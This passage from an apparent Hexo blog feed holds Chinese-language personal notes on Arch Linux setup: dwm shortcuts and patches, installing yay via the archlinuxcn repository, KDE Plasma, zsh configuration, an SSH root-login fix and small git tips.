title="驱动安装"></a>驱动安装</h4><p>查看显卡类型:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lspci <span class="hljs-string">|grep -e VGA -e 3D</span><br></code></pre></td></tr></table></figure><p>有几个输出说明有几个显卡.</p><p>查看所有开源驱动:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">pacman -Ss xf86-<span class="hljs-selector-tag">video</span><br></code></pre></td></tr></table></figure><p><img src="/../img/%E9%A9%B1%E5%8A%A8.png" alt="驱动"></p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>Xorg 命令通常不直接运行，而是使用显示管理器或者 xinit 来启动 X server.</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>Arch 提供了位于 <code>/usr/share/X11/xorg.conf.d</code> 的默认配置文件.</p><h1 id="dwm-1"><a href="#dwm-1" class="headerlink" title="dwm"></a>dwm</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="打开终端"><a href="#打开终端" class="headerlink" title="打开终端"></a>打开终端</h3><p><code>[Shift]+[Alt]+[Enter]</code></p><h3 id="打开-dmenu"><a href="#打开-dmenu" class="headerlink" title="打开 dmenu"></a>打开 dmenu</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><h3 id="切换-master-window-和-stack-window"><a href="#切换-master-window-和-stack-window" class="headerlink" title="切换 master window 和 stack window"></a>切换 master window 和 stack window</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-attr">[Enter]</span><br></code></pre></td></tr></table></figure><h3 id="Moving-Aroung"><a href="#Moving-Aroung" class="headerlink" title="Moving Aroung"></a>Moving Aroung</h3><p><code>  [Alt]+[j]</code><br>或者<br><code>  [Alt]+[k]</code></p><h3 id="将一个小窗口移动到其他-Tab-中"><a href="#将一个小窗口移动到其他-Tab-中" class="headerlink" title="将一个小窗口移动到其他 Tab 中"></a>将一个小窗口移动到其他 Tab 中</h3><p>如</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-attr">[Shift]</span>+<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>会把当前的这一个 window 移动到 tab 2 中。</p><h3 id="进入其他的-Tab"><a href="#进入其他的-Tab" class="headerlink" title="进入其他的 Tab"></a>进入其他的 Tab</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">[Alt]+[<span class="hljs-literal">Tab</span> <span class="hljs-built_in">number</span>]<br></code></pre></td></tr></table></figure><h3 id="选择一个-window-作为-master"><a href="#选择一个-window-作为-master" class="headerlink" title="选择一个 window 作为 master"></a>选择一个 window 作为 master</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-tag">i</span><br></code></pre></td></tr></table></figure><p>这里的 <code>i</code> 为 increase.</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[Alt]</span>+d<br></code></pre></td></tr></table></figure><p>这里的 <code>d</code> 为 decrease.</p><h3 id="关闭一个-window"><a href="#关闭一个-window" class="headerlink" title="关闭一个 window"></a>关闭一个 window</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-attr">[Shift]</span>+c<br></code></pre></td></tr></table></figure><h3 id="退出-dwm"><a href="#退出-dwm" class="headerlink" title="退出 dwm"></a>退出 dwm</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-attr">[Shift]</span>+<span class="hljs-selector-tag">q</span><br></code></pre></td></tr></table></figure><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><h3 id="几个补丁及其作用"><a href="#几个补丁及其作用" class="headerlink" title="几个补丁及其作用"></a>几个补丁及其作用</h3><p>alpha : 状态栏透明.</p><p>autostart : 自动启动脚本的功能</p><p>awesomebar : 状态栏显示名称</p><p>alpha : 状态栏透明.</p><p>autostart : 自动启动脚本的功能</p><p>awesomebar : 状态栏显示名称</p><p>fullscreen : 完全全屏</p><p>hide-and-restore : 隐藏一个窗口</p><p>hide_vacant_tags : 只显示是有窗口的 tags.</p><p>pertag : 每个窗口可以有不同的管理模式</p><p>viewontag : 在移动标签时用户也跟着移动.</p><p>rotatestack : 调整 stack </p><p>scratchpad : 打开一个小窗口</p><p>vanitygaps : 窗口之间的小空隙</p><p><code>.diff</code> 文件就是告诉打补丁的工具需要在源代码上加上哪些行, 删除哪些行.</p><h3 id="开机启动项"><a href="#开机启动项" class="headerlink" title="开机启动项"></a>开机启动项</h3><p>先打上 autostart 这个补丁, 然后查看 <code>dwm.c</code> 文件里面的 <code>Autostart</code> 这个函数, 它会帮我们启动一个脚本:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">    <span class="hljs-keyword">void</span><br>    <span class="hljs-title function_">runAutostart</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>) &#123;<br>        <span class="hljs-title function_">system</span>(<span class="hljs-string">&quot;cd ~/scripts; ./autostart.sh &amp;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>system</code> 这个命令是执行一个系统命令.</p><p>需要下载表情字体.</p><p>trayer 程序, 显示系统托盘.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>yay -S trayer<br></code></pre></td></tr></table></figure><p>在 dwm 下定义快捷键, 修改 <code>config.h</code> 文件中的 <code>static Key keys[]</code>.</p><p>MODKEY 缺省状态是 [Alt] 键.</p><h3 id="配置状态条"><a href="#配置状态条" class="headerlink" title="配置状态条"></a>配置状态条</h3><p>使用 <code>xsetroot</code> 命令.</p><h3 id="在不登出和退出程序的情况下重启-dwm"><a href="#在不登出和退出程序的情况下重启-dwm" class="headerlink" title="在不登出和退出程序的情况下重启 dwm"></a>在不登出和退出程序的情况下重启 dwm</h3><p>添加:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-comment"># Log stderror to a file </span><br>    dwm 2&gt; ~/.dwm.log<br>    <span class="hljs-comment"># No error logging</span><br>    <span class="hljs-comment">#dwm &gt;/dev/null 2&gt;&amp;1</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="自定义快捷键"><a href="#自定义快捷键" class="headerlink" title="自定义快捷键"></a>自定义快捷键</h3><p>单个按键如 Fn 或多媒体键必须要用 16 进制数来表示, 可以用 xev 程序来获得, 或者查看 <code>/usr/include/X11/XF86keysym.h</code> 中的定义.</p><p>定义 keybindname 的内容:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *&lt;keybindname&gt;[]   = &#123; <span class="hljs-string">&quot;&lt;command&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;flags&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;arguments&gt;&quot;</span>, <span class="hljs-literal">NULL</span> &#125;;&#125;<br></code></pre></td></tr></table></figure><p>用 Mod+<key> 来执行命令:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123; MODKEY,            XK_<span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>,      spawn,          &#123;.v = <span class="hljs-tag">&lt;<span class="hljs-name">keybindname</span>&gt;</span> &#125; &#125;,<br></code></pre></td></tr></table></figure><p>用 Mod+Shift+<key> 来执行命令:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123; MODKEY|ShiftMask,  XK_<span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>,      spawn,          &#123;.v = <span class="hljs-tag">&lt;<span class="hljs-name">keybindname</span>&gt;</span> &#125; &#125;,<br></code></pre></td></tr></table></figure><p>用 Mod+Ctrl+<key> 来执行命令:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123; MODKEY|ControlMask,  XK_<span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>,      spawn,          &#123;.v = <span class="hljs-tag">&lt;<span class="hljs-name">keybindname</span>&gt;</span> &#125; &#125;,<br></code></pre></td></tr></table></figure><p>grave 键就是 <code>~</code> 所处的位置.</p><h3 id="改变间隙"><a href="#改变间隙" class="headerlink" title="改变间隙"></a>改变间隙</h3><p><code>gappov</code> 这个是和左边的间隙.</p><p><code>gappoh</code> 是和下面的间隙.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Arch 中的 Yay</title>
    <link href="/2022/09/02/Arch-%E4%B8%AD%E7%9A%84-Yay/"/>
    <url>/2022/09/02/Arch-%E4%B8%AD%E7%9A%84-Yay/</url>
    
    <content type="html"><![CDATA[<p>yay 是一个 AUR helper，其会帮你从 AUR 安装软件.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://aur.archlinux.org/yay.git --<span class="hljs-attr">depth=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>进入目录后执行:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">makepkg -si</span><br></code></pre></td></tr></table></figure><p>可以通过:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -Qs yay</span><br></code></pre></td></tr></table></figure><p>来查看本机安装的 yay 程序.</p><h1 id="上述安装时可能会报错"><a href="#上述安装时可能会报错" class="headerlink" title="上述安装时可能会报错"></a>上述安装时可能会报错</h1><p>使用另一种方法安装, 先添加 archlinuxcn 的源</p><h2 id="开启-32-位软件库支持和-ArchlinuxCN-库的支持"><a href="#开启-32-位软件库支持和-ArchlinuxCN-库的支持" class="headerlink" title="开启 32 位软件库支持和 ArchlinuxCN 库的支持"></a>开启 32 位软件库支持和 ArchlinuxCN 库的支持</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo vim <span class="hljs-regexp">/etc/</span>pacman.conf<br></code></pre></td></tr></table></figure><p>将 <code>[multilib]</code> 一节中的两行注释去掉.</p><p>在文档的最后添加:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">[archlinuxcn]<br>Server = https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/archlinuxcn/</span><span class="hljs-variable">$arch</span><br></code></pre></td></tr></table></figure><p>执行 <code>sudo pacman -Syyu</code> 更新 pacman 数据库.</p><p>安装 <code>archlinuxcn-keyring</code> 包导入 GPG key:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S archlinuxcn-keyring</span><br></code></pre></td></tr></table></figure><p>若报错，则执行以下命令:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo pacman -Syyu<br>sudo pacman -S haveged<br>sudo pacman -Syu haveged<br>sudo systemctl <span class="hljs-keyword">start</span> haveged<br>sudo systemctl <span class="hljs-keyword">enable</span> haveged<br><br>sudo rm -fr /etc/pacman.d/gnupg<br>sudo pacman-key <span class="hljs-comment">--init</span><br>sudo pacman-key <span class="hljs-comment">--populate archlinux</span><br>sudo pacman-key <span class="hljs-comment">--populate archlinuxcn</span><br></code></pre></td></tr></table></figure><p>最后安装 <code>yay</code>:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S yay</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中 KDE 部分</title>
    <link href="/2022/09/02/ArchWiki-%E4%B8%AD-KDE-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/02/ArchWiki-%E4%B8%AD-KDE-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/KDE">ArchWiki</a><br>首先，KDE 是一套由 Plasma 桌面环境、一系列的库、框架 (KDE Frameworks) 和一些应用组成的软件项目.</p><p>所以说，Plasma 才是桌面环境, KDE 只是软件项目.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Plasma-桌面"><a href="#Plasma-桌面" class="headerlink" title="Plasma 桌面"></a>Plasma 桌面</h2><p>安装 Plasma 之前需安装 Xorg 依赖:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">sudo pacman -S xorg xorg-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>安装 plasma-meta 元软件包:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo pacman -S plasma-<span class="hljs-keyword">meta</span><br></code></pre></td></tr></table></figure><h1 id="启动-Plasma"><a href="#启动-Plasma" class="headerlink" title="启动 Plasma"></a>启动 Plasma</h1><p>若使用 <code>xinit/startx</code> 启动 Plasma 桌面，在 <code>.xinitrc</code> 文件中添加 <code>export DESKTOP_SESSION=plasma</code></p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>KDE 应用大部分配置存储于 <code>~/.config</code> 目录下.</p><h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><p>Plasma 和 SDDM 都会使用存在 <code>/var/lib/AccountsService/icons/</code> 的图像作为用户头像.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ssh 远程连接时 permission denied</title>
    <link href="/2022/09/02/ssh-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%97%B6-permission-denied/"/>
    <url>/2022/09/02/ssh-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%97%B6-permission-denied/</url>
    
    <content type="html"><![CDATA[<p>可能存在三种情况:</p><ol><li>检查并确定密码有没有错误</li><li>查看用户名是否存在</li><li>若是登录 root 账户，一般是配置文件中将 root 设置为不允许远程登录.</li></ol><p>sshd 的配置文件为 <code>/etc/ssh/sshd_config</code>.</p><p>修改为允许 root 远程登录, 即添加一行 <code>PermitRootLogin yes</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是 dhcpcd, e2fsprogs, iwd</title>
    <link href="/2022/09/02/%E4%BB%80%E4%B9%88%E6%98%AF-dhcpcd-e2fsprogs-iwd/"/>
    <url>/2022/09/02/%E4%BB%80%E4%B9%88%E6%98%AF-dhcpcd-e2fsprogs-iwd/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于操作系统在 PATH 路径下查找命令</title>
    <link href="/2022/09/02/%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9C%A8-PATH-%E8%B7%AF%E5%BE%84%E4%B8%8B%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/02/%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9C%A8-PATH-%E8%B7%AF%E5%BE%84%E4%B8%8B%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>不会递归查找 <code>$PATH</code> 中添加目录之下的子目录.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>将 hexo 博客上传到 gitee</title>
    <link href="/2022/09/02/%E5%B0%86-hexo-%E5%8D%9A%E5%AE%A2%E4%B8%8A%E4%BC%A0%E5%88%B0-gitee/"/>
    <url>/2022/09/02/%E5%B0%86-hexo-%E5%8D%9A%E5%AE%A2%E4%B8%8A%E4%BC%A0%E5%88%B0-gitee/</url>
    
    <content type="html"><![CDATA[<p>本以为会和 deploy-git 冲突，然而并没有。</p><p>先在 gitee 上新建仓库。</p><p>回到本地的 Blog 目录，<code>git init</code> 创建成 git 仓库，<code>git add .</code> 和 <code>git commit</code> 之后 <code>git remote add</code> 添加远程仓库，直接 <code>git pull</code> 就行.</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>用 Git 克隆单个分支</title>
    <link href="/2022/09/01/%E7%94%A8-Git-%E5%85%8B%E9%9A%86%E5%8D%95%E4%B8%AA%E5%88%86%E6%94%AF/"/>
    <url>/2022/09/01/%E7%94%A8-Git-%E5%85%8B%E9%9A%86%E5%8D%95%E4%B8%AA%E5%88%86%E6%94%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Arch_User_Repositor">ArchWiki</a><br>在 ArchWiki 上看的.</p><p>代码如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> --branch branch_name/package_name --single-branch https://github.com/archlinux/aur</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>打开 gnome-shell-extension</title>
    <link href="/2022/09/01/%E6%89%93%E5%BC%80-gnome-shell-extension/"/>
    <url>/2022/09/01/%E6%89%93%E5%BC%80-gnome-shell-extension/</url>
    
    <content type="html"><![CDATA[<p>原本这个东西在 <code>gnome-tweaks tool</code> 里面，现在独立出来了，在应用栏里面搜索 <code>extension</code> 就会找到.</p>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>git push 后文件夹为空且带 @xxxx</title>
    <link href="/2022/08/31/git-push-%E5%90%8E%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%BA%E7%A9%BA%E4%B8%94%E5%B8%A6-xxxx/"/>
    <url>/2022/08/31/git-push-%E5%90%8E%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%BA%E7%A9%BA%E4%B8%94%E5%B8%A6-xxxx/</url>
    
    <content type="html"><![CDATA[<p>提交的文件夹是 git 拉取而来的，文件夹里面原本就有 <code>.git</code> 目录，因此会提交给另一个远程分支上去。</p><p>删除 <code>.git</code> 目录即可解决。</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安装和使用 zsh</title>
    <link href="/2022/08/31/%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8-zsh/"/>
    <url>/2022/08/31/%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8-zsh/</url>
    
    <content type="html"><![CDATA[<h1 id="参考-ArchWiki"><a href="#参考-ArchWiki" class="headerlink" title="参考 ArchWiki"></a>参考 <a href="https://wiki.archlinux.org/title/Zsh">ArchWiki</a></h1><p>Zsh 默认不兼容 sh, 仅在使用 <code>emulate sh</code> 时兼容.</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>查看当前使用的 Shell 软件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span></span><br></code></pre></td></tr></table></figure><p>可以安装 zsh 包, 或者有精确补全命令的 zsh-completions 包.</p><h3 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h3><p>手动进入新用户向导:</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">$ autoload -Uz zsh-<span class="hljs-keyword">new</span><span class="hljs-type">user</span>-install<br>$ zsh-<span class="hljs-keyword">new</span><span class="hljs-type">user</span>-install -f<br></code></pre></td></tr></table></figure><h3 id="改变默认的-shell"><a href="#改变默认的-shell" class="headerlink" title="改变默认的 shell"></a>改变默认的 shell</h3><p>使用 <code>chsh</code> 命令.</p><h2 id="配置文件介绍"><a href="#配置文件介绍" class="headerlink" title="配置文件介绍"></a>配置文件介绍</h2><p>zsh 的几个配置文件, <code>~/.zshrc</code>, 以及 <code>~/zprofile</code>.</p><p>同样分全局配置和用户的配置文件.</p><p>其他的具体看 wiki.</p><p>Arch 源中的 zsh 所使用的文件路径和 Zsh 的 man 手册中默认的不同.</p><p><code>/etc/profile</code> 里面设置的 <code>$PATH</code> 环境变量会覆盖掉 <code>~/.zshenv</code> 里面配置的任何 <code>$PATH</code>.</p><h3 id="全局配置文件"><a href="#全局配置文件" class="headerlink" title="全局配置文件"></a>全局配置文件</h3><p>Arch 源中 zsh 的全局配置文件的路径为 <code>/etc/zsh/</code></p><h2 id="配置-Zsh"><a href="#配置-Zsh" class="headerlink" title="配置 Zsh"></a>配置 Zsh</h2><p><a href="https://zsh.sourceforge.io/Guide/zshguide.html">官方 tutorial</a><br>Zsh 有较多的可定制选项.</p><h3 id="命令补全"><a href="#命令补全" class="headerlink" title="命令补全"></a>命令补全</h3><p>在 <code>~/.zshrc</code> 最后加入下面配置, 开启自动补全:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>load -U compinit<br>compinit<br></code></pre></td></tr></table></figure><p>启动使用方向键控制的自动补全:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">zstyle <span class="hljs-string">&#x27;:completion:*&#x27;</span> <span class="hljs-keyword">menu</span> <span class="hljs-keyword">select</span><br></code></pre></td></tr></table></figure><p>按两次 tab 键启动菜单.</p><p>启动命令行别名的自动补全:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">setopt</span> completealiases<br></code></pre></td></tr></table></figure><h3 id="快捷键绑定"><a href="#快捷键绑定" class="headerlink" title="快捷键绑定"></a>快捷键绑定</h3><p>Zsh 使用自带的 zle 代替 readline, 并且不会读取 <code>/etc/inputrc</code>  或者 <code>~/.inputrc</code>.</p><p>Zle 有 emacs 和 vi 两个模式, 默认情况下根据环境变量 <code>$EDITOR</code> 来决定使用哪一个模式. 使用 <code>bindkey -e</code> 或者 <code>bindkey -v</code> 来手动指定模式.</p><h3 id="命令提示符"><a href="#命令提示符" class="headerlink" title="命令提示符"></a>命令提示符</h3><p>首先确保 <code>.zshrc</code> 中配置了自动加载提示符:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>load -U promptinit<br>promptinit<br></code></pre></td></tr></table></figure><p>运行下面命令查看可用的提示符:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>prompt -l<br></code></pre></td></tr></table></figure><p>使用下面命令来启动其中一种提示符, 如 “walters”:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>prompt walters<br></code></pre></td></tr></table></figure><p>查看所有可用的主题:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>prompt -p<br></code></pre></td></tr></table></figure><h3 id="自定义命令提示符"><a href="#自定义命令提示符" class="headerlink" title="自定义命令提示符"></a>自定义命令提示符</h3><p>除了普通终端会提供的靠左的提示符外, Zsh 还提供了靠右的提示符, 通过配置 <code>PROMPT=</code> 来设置.</p><p>具体见 <a href="https://zsh.sourceforge.io/Doc/Release/Prompt-Expansion.html">Prompt Expansion</a></p><p>色彩设置见 wiki.</p><h3 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h3><p>zsh 没有内置的 <code>help</code> 命令, 想要在 zsh 中使用 <code>help</code> 可以添加:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">autoload -<span class="hljs-keyword">U</span> <span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span><br>autoload <span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span>-git<br>autoload <span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span>-svn<br>autoload <span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span>-svk<br>unalias <span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span><br>alias <span class="hljs-keyword">help</span>=<span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span><br></code></pre></td></tr></table></figure><h3 id="仿-Fish-命令高亮"><a href="#仿-Fish-命令高亮" class="headerlink" title="仿 Fish 命令高亮"></a>仿 Fish 命令高亮</h3><p>从官方仓库安装 zsh-syntax-highlighting, 然后添加配置:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/zsh/</span>plugins<span class="hljs-regexp">/zsh-syntax-highlighting/</span>zsh-syntax-highlighting.zsh<br></code></pre></td></tr></table></figure><p>几个参考示例:</p><ul><li><a href="https://grml.org/zsh">配置技巧</a></li><li><a href="https://github.com/MrElendig/dotfiles-alice/blob/master/.zshrc">动态提示符和终端窗口标题等基本配置</a></li><li><a href="https://github.com/slashbeast/conf-mgmt/blob/master/roles/home_files/files/DOTzshrc">关于很多 zsh 的特性</a></li></ul><h3 id="配置框架"><a href="#配置框架" class="headerlink" title="配置框架"></a>配置框架</h3><ul><li>oh-my-zsh</li><li>Prezto - Instantly Awesome Zsh</li><li>Antigen, 为插件管理器.</li></ul><h3 id="刷新自动补全"><a href="#刷新自动补全" class="headerlink" title="刷新自动补全"></a>刷新自动补全</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">rehash</span></span><br></code></pre></td></tr></table></figure><p>自动执行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">zstyle</span> <span class="hljs-string">&#x27;:completion:*&#x27;</span> <span class="hljs-built_in">rehash</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><hr><p>进入 zsh 的 vi 编辑模式，按 <code>esc</code>.<br>阅读书籍 《Learning Shell Scripting with Zsh》</p><h1 id="1-Getting-Started"><a href="#1-Getting-Started" class="headerlink" title="1 Getting Started"></a>1 Getting Started</h1><p>zsh 配置文件 